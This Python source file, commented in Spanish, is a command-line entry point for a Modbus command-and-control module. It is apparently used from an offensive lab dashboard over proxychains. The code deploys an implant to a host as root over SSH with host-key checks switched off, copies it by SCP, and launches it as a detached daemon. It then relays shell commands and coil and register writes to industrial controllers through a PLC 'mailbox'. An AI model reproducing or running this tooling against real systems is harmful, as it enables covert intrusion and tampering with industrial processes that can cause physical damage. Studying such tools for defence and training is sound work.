#!/usr/bin/env python3
"""
Entrypoint CLI del módulo C2 Modbus, lanzable como subproceso con proxychains.

Se invoca desde el dashboard así:
    [proxychains] python3 -m modules._cli.c2_modbus_cli <accion> --mailbox <ip> ...

Imprime a stdout; es el dashboard (via runner.run_command) quien captura esa
salida y la vuelca al fichero de evidencia.
"""

import argparse
import os
import sys
import time

_BASE = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _BASE not in sys.path:
    sys.path.insert(0, _BASE)

from modules import c2_modbus  # noqa: E402


# Secuencia global para esta sesión CLI.
_seq_counter = int(time.time()) & 0xFFFF


def _next_seq():
    global _seq_counter
    _seq_counter = (_seq_counter + 1) & 0xFFFF
    return _seq_counter


def _sink(line):
    print(line, flush=True)


def main():
    p = argparse.ArgumentParser(prog="c2_modbus_cli")
    p.add_argument("action", choices=[
        "deploy", "shell", "write_coil", "write_register",
        "exit_implant"])
    p.add_argument("--mailbox", default="192.168.10.11",
                    help="IP del PLC-buzón")
    p.add_argument("--mailbox-port", type=int, default=502)
    p.add_argument("--xor-key", default=None)
    p.add_argument("--timeout", type=int, default=30,
                    help="Timeout en segundos para esperar respuesta")

    # Parámetros de deploy
    p.add_argument("--implant-host", default=None)
    p.add_argument("--ssh-key", default=None)
    p.add_argument("--poll", type=float, default=3.0)
    p.add_argument("--uid", type=int, default=2,
                    help="Unit ID del PLC-buzón (ACL)")

    # Parámetros de shell
    p.add_argument("--command", default=None)

    # Parámetros de ataques OT
    p.add_argument("--target-ip", default=None)
    p.add_argument("--data-address", type=int, default=0)
    p.add_argument("--value", type=int, default=0)
    args = p.parse_args()

    xor_key = args.xor_key

    if args.action == "deploy":
        c2_modbus._do_deploy_implant(
            args.implant_host or "192.168.60.50",
            args.ssh_key or "/ataques/work/id_rsa",
            args.mailbox, args.mailbox_port,
            xor_key, args.poll, sink=_sink)
        # Ejecución real del deploy vía SSH
        import subprocess
        ssh_key = args.ssh_key or "/ataques/work/id_rsa"
        host = args.implant_host or "192.168.60.50"
        implant_src = os.path.join(
            os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
            "c2_modbus_implant.py")

        # Instalar Python3 + pymodbus en el host remoto
        _sink("[*] Instalando Python3 y pymodbus en el host remoto...")
        subprocess.run([
            "ssh", "-i", ssh_key,
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            f"root@{host}",
            # Alpine (apk) o Debian (apt-get)
            "(apk update && apk add python3 py3-pip 2>/dev/null) "
            "|| (apt-get update && apt-get install -y python3 python3-pip 2>/dev/null) "
            "|| true; "
            "pip3 install --break-system-packages pymodbus 2>/dev/null "
            "|| pip install --break-system-packages pymodbus 2>/dev/null "
            "|| pip3 install pymodbus 2>/dev/null "
            "|| echo 'WARN: no se pudo instalar pymodbus'",
        ], timeout=180, capture_output=False)

        # Copiar implante
        _sink("[*] Copiando implante vía SCP...")
        scp_result = subprocess.run([
            "scp", "-i", ssh_key,
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            implant_src,
            f"root@{host}:/tmp/c2_modbus_implant.py",
        ], timeout=60, capture_output=True, text=True)
        if scp_result.returncode != 0:
            _sink(f"[!] SCP falló: {scp_result.stderr}")
            return
        _sink("[+] Implante copiado a /tmp/c2_modbus_implant.py")

        # Matar instancias previas (SSH separado para que pkill -f
        # no coincida con la línea del ash que lanza el daemon).
        xor_arg = f"--xor-key {xor_key}" if xor_key else ""
        implant_cmd = (
            f"python3 /tmp/c2_modbus_implant.py "
            f"--mailbox {args.mailbox} --port {args.mailbox_port} "
            f"--poll {args.poll} --uid {args.uid} {xor_arg}"
        ).strip()

        _sink("[*] Matando instancias previas del implante...")
        subprocess.run([
            "ssh", "-i", ssh_key,
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            f"root@{host}",
            "pkill -f '[c]2_modbus_implant.py' 2>/dev/null; sleep 1; echo OK",
        ], timeout=15, capture_output=True)

        # Arrancar daemon con setsid + & (no double-fork: el CLI
        # corre detrás de un pipe y el fork de Python no sobrevive).
        remote_cmd = (
            f"setsid {implant_cmd} "
            f"</dev/null >/tmp/c2_implant.log 2>&1 & "
            f"sleep 3; "
            f"if ps aux | grep -v grep | grep -q c2_modbus_implant; then "
            f"echo '[OK] Implante corriendo:'; "
            f"ps aux | grep -v grep | grep c2_modbus; "
            f"head -10 /tmp/c2_implant.log; "
            f"else echo '[FAIL] Implante NO esta corriendo'; "
            f"cat /tmp/c2_implant.log 2>/dev/null; fi"
        )
        _sink(f"[*] Ejecutando implante en {host}...")
        subprocess.run([
            "ssh", "-i", ssh_key,
            "-o", "StrictHostKeyChecking=no",
            "-o", "UserKnownHostsFile=/dev/null",
            f"root@{host}",
            remote_cmd,
        ], timeout=60, capture_output=False)
        _sink(f"[+] Implante desplegado en {host}")
        _sink(f"    Log remoto: /tmp/c2_implant.log")
        _sink(f"    Para verificar: ssh root@{host} 'ps aux | grep c2_modbus'")

    elif args.action == "shell":
        if not args.command:
            _sink("[!] Falta --command")
            return
        seq = _next_seq()
        c2_modbus._do_c2_shell(
            args.mailbox, args.mailbox_port,
            args.command, seq, xor_key, args.timeout, sink=_sink)

    elif args.action == "write_coil":
        if not args.target_ip:
            _sink("[!] Falta --target-ip")
            return
        seq = _next_seq()
        c2_modbus._do_c2_write_coil(
            args.mailbox, args.mailbox_port,
            args.target_ip, args.data_address, args.value,
            seq, xor_key, args.timeout, sink=_sink)

    elif args.action == "write_register":
        if not args.target_ip:
            _sink("[!] Falta --target-ip")
            return
        seq = _next_seq()
        c2_modbus._do_c2_write_register(
            args.mailbox, args.mailbox_port,
            args.target_ip, args.data_address, args.value,
            seq, xor_key, args.timeout, sink=_sink)

    elif args.action == "exit_implant":
        seq = _next_seq()
        c2_modbus._do_c2_exit(
            args.mailbox, args.mailbox_port,
            seq, xor_key, args.timeout, sink=_sink)


if __name__ == "__main__":
    main()
